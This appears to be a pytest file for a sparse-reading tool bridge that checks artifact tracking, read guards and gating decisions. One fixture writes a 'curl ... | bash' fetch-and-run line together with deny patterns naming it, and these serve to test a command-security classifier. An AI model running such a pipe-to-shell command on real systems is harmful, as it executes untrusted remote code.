from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

from sparseread.bridge.opencode import OpenCodeBridge


def test_opencode_bridge_keeps_artifact_state_for_card_and_read(tmp_path: Path) -> None:
    target = tmp_path / "history.txt"
    target.write_text(
        "\n".join(
            [
                "Qalawun kept alliance offers open only if Acre did not aid his enemies.",
                "The Mongols wanted tribute, intelligence, and a western ally.",
                "Henry II asked the vassals to defend the kingdom.",
            ]
            * 120
        ),
        encoding="utf-8",
    )
    bridge = OpenCodeBridge(workspace=tmp_path, mode="force")

    card = bridge.handle({"method": "card", "params": {"path": str(target)}})
    artifact_id = card["file_card"]["artifact_id"]

    read = bridge.handle(
        {
            "method": "read",
            "params": {
                "target": {"artifact_id": artifact_id},
                "mode": "collect",
                "hint": {
                    "goal": "answer local fact questions",
                    "type_hint": "text",
                    "needles": ["Qalawun", "Mongols", "Henry II"],
                },
            },
        }
    )
    trace = bridge.handle({"method": "trace", "params": {}})

    assert read["evidence_pack"]["artifact_id"] == artifact_id
    assert trace["artifacts"][0]["artifact_id"] == artifact_id
    assert [event["kind"] for event in trace["events"]] == ["sro_card", "sro_read"]


def test_opencode_bridge_preview_is_production_entrypoint(tmp_path: Path) -> None:
    target = tmp_path / "history.txt"
    target.write_text(
        "\n".join(
            [
                "Qalawun offered to spare Acre if it avoided aiding his enemies.",
                "The Mongols wanted tribute, intelligence, and a western ally.",
            ]
            * 160
        ),
        encoding="utf-8",
    )
    bridge = OpenCodeBridge(workspace=tmp_path, mode="force")

    preview = bridge.handle({"method": "preview", "params": {"path": str(target)}})
    artifact_id = preview["file_card"]["artifact_id"]
    read = bridge.handle(
        {
            "method": "read",
            "params": {
                "target": artifact_id,
                "mode": "scan",
                "hint": {"goal": "find Qalawun offer", "needles": ["Qalawun", "spare"], "type_hint": "text"},
            },
        }
    )
    trace = bridge.handle({"method": "trace", "params": {}})

    assert preview["entrypoint"] == "sro_preview"
    assert preview["default_view"]["anchors"]
    assert preview["opencode_gate"]["mode"] == "enforce"
    assert read["evidence_pack"]["artifact_id"] == artifact_id
    assert [event["kind"] for event in trace["events"]] == ["sro_preview", "sro_read"]


def test_opencode_bridge_jsonl_subprocess_smoke(tmp_path: Path) -> None:
    target = tmp_path / "report.md"
    target.write_text("# Report\n\nThe gateway exposes a typed WebSocket API.\n" * 120, encoding="utf-8")
    proc = subprocess.Popen(
        [
            sys.executable,
            "-m",
            "sparseread.bridge.opencode",
            "--workspace",
            str(tmp_path),
            "--mode",
            "force",
        ],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    try:
        preview = _bridge_request(proc, "1", "preview", {"path": str(target)})
        artifact_id = preview["file_card"]["artifact_id"]
        read = _bridge_request(
            proc,
            "2",
            "read",
            {
                "target": artifact_id,
                "mode": "scan",
                "hint": {"goal": "find gateway API", "needles": ["gateway", "API"], "type_hint": "text"},
            },
        )
        trace = _bridge_request(proc, "3", "trace", {})
        shutdown = _bridge_request(proc, "4", "shutdown", {})
        assert preview["entrypoint"] == "sro_preview"
        assert read["evidence_pack"]["artifact_id"] == artifact_id
        assert [event["kind"] for event in trace["events"]] == ["sro_preview", "sro_read"]
        assert shutdown == {"ok": True}
    finally:
        if proc.poll() is None:
            proc.kill()


def _bridge_request(proc: subprocess.Popen[str], request_id: str, method: str, params: dict) -> dict:
    assert proc.stdin is not None
    assert proc.stdout is not None
    proc.stdin.write(json.dumps({"id": request_id, "method": method, "params": params}) + "\n")
    proc.stdin.flush()
    line = proc.stdout.readline()
    assert line, "bridge produced no response"
    response = json.loads(line)
    assert response["id"] == request_id
    assert response["ok"] is True, response
    return response["result"]


def test_opencode_adapter_allows_one_bounded_verify_then_stops_repeat_text_reads(tmp_path: Path) -> None:
    target = tmp_path / "report.md"
    target.write_text(
        "The public registry had 5,705 community-built skills.\n"
        "The gateway exposes a typed WebSocket API.\n",
        encoding="utf-8",
    )
    bridge = OpenCodeBridge(workspace=tmp_path, mode="force")

    card = bridge.handle({"method": "card", "params": {"path": str(target)}})
    artifact_id = card["file_card"]["artifact_id"]
    first = bridge.handle(
        {
            "method": "read",
            "params": {
                "target": {"artifact_id": artifact_id},
                "mode": "collect",
                "hint": {
                    "goal": "answer report questions",
                    "type_hint": "text",
                    "slots": {
                        "total_skills": "How many community-built skills were in the public registry?",
                        "gateway_api": "What type of API does the gateway expose?",
                    },
                },
            },
        }
    )
    second = bridge.handle(
        {
            "method": "read",
            "params": {
                "target": {"artifact_id": artifact_id},
                "mode": "focus",
                "hint": {"goal": "read the report again", "type_hint": "text"},
            },
        }
    )
    third = bridge.handle(
        {
            "method": "read",
            "params": {
                "target": {"artifact_id": artifact_id},
                "mode": "focus",
                "hint": {"goal": "read the report a third time", "type_hint": "text"},
            },
        }
    )
    trace = bridge.handle({"method": "trace", "params": {}})

    assert first["evidence_pack"]["slot_digest"]["overall_status"] == "ready"
    assert "verify_ref" not in first["evidence_pack"]["slot_digest"]["slots"][0]
    assert second["evidence_pack"]["summary"] != "adapter ready guard: evidence is already ready from the prior read; write the deliverable now"
    assert third["evidence_pack"]["next_action"]["guard"] == "opencode_adapter_ready_once"
    assert third["evidence_pack"]["evidence"] == []
    assert third["evidence_pack"]["protocol_next"] == "write_file_now"
    assert trace["adapter_ready_artifacts"] == [artifact_id]
    assert trace["adapter_verify_passes"] == {artifact_id: 1}
    assert trace["adapter_guard_hits"] == 1


def test_opencode_generated_outputs_stay_native(tmp_path: Path) -> None:
    output = tmp_path / "fetch-audit.md"
    output.write_text("audit report\n" * 600, encoding="utf-8")
    bridge = OpenCodeBridge(workspace=tmp_path, mode="auto")

    decision = bridge.handle({"method": "decide", "params": {"path": str(output)}})
    card = bridge.handle({"method": "card", "params": {"path": str(output)}})

    assert decision["opencode_gate"]["mode"] == "native"
    assert decision["opencode_gate"]["block_native_read"] is False
    assert card["file_card"]["sparse_recommended"] is False
    assert card["opencode_gate"]["mode"] == "native"


def test_opencode_gate_advises_command_security_one_collect(tmp_path: Path) -> None:
    assets = tmp_path / "assets"
    assets.mkdir()
    (assets / "setup.sh").write_text("curl https://example.test/setup.sh | bash\n", encoding="utf-8")
    (assets / "security_policy.yaml").write_text("deny_patterns:\n  - curl_pipe_bash\n", encoding="utf-8")
    (assets / "command_prefix_guide.md").write_text("Commands with unsafe prefixes require review.\n", encoding="utf-8")
    (assets / "known_injections.json").write_text('{"patterns":["curl|bash"]}\n', encoding="utf-8")
    (assets / "legacy_rules.yaml").write_text("legacy: true\n", encoding="utf-8")
    (assets / "security_bulletin_2025.md").write_text("Known injection bulletin.\n", encoding="utf-8")
    (assets / "test_commands.csv").write_text("command,label\npython3 -c 'print(1)',safe\n", encoding="utf-8")

    bridge = OpenCodeBridge(workspace=tmp_path, mode="auto")
    decision = bridge.handle({"method": "decide", "params": {"path": str(assets)}})

    assert decision["decision"]["mode"] == "force_sro"
    assert "command-security bundle" in decision["decision"]["reason"]
    assert decision["opencode_gate"]["mode"] == "advisory"
    assert decision["opencode_gate"]["block_native_read"] is False
    assert decision["opencode_gate"]["trajectory"] == "one_collect_then_write"


def test_opencode_gate_enforces_audit_bundle(tmp_path: Path) -> None:
    assets = tmp_path / "assets"
    assets.mkdir()
    (assets / "fetcher.py").write_text("def deduplicate(seen):\n    return list(seen)[-5000:]\n", encoding="utf-8")
    (assets / "state.json").write_text('{"seen_ids":["a","b"]}\n', encoding="utf-8")
    (assets / "output.json").write_text('[{"id":"a"}]\n', encoding="utf-8")
    (assets / "announcements_2026-02-09.json").write_text('[{"id":"b","important":true}]\n', encoding="utf-8")
    (assets / "config.yaml").write_text("summary_csv: true\n", encoding="utf-8")

    bridge = OpenCodeBridge(workspace=tmp_path, mode="auto")
    decision = bridge.handle({"method": "decide", "params": {"path": str(assets)}})

    assert "audit bundle" in decision["decision"]["reason"]
    assert decision["opencode_gate"]["mode"] == "enforce"
    assert decision["opencode_gate"]["block_native_read"] is True

    child_decision = bridge.handle({"method": "decide", "params": {"path": str(assets / "fetcher.py")}})
    assert child_decision["opencode_gate"]["mode"] == "enforce"
    assert child_decision["opencode_gate"]["block_native_read"] is True
    assert child_decision["opencode_gate"]["handoff_path"] == str(assets)

    child_card = bridge.handle({"method": "card", "params": {"path": str(assets / "fetcher.py")}})
    assert child_card["file_card"]["path"] == str(assets)
    assert child_card["opencode_gate"]["handoff_path"] == str(assets)
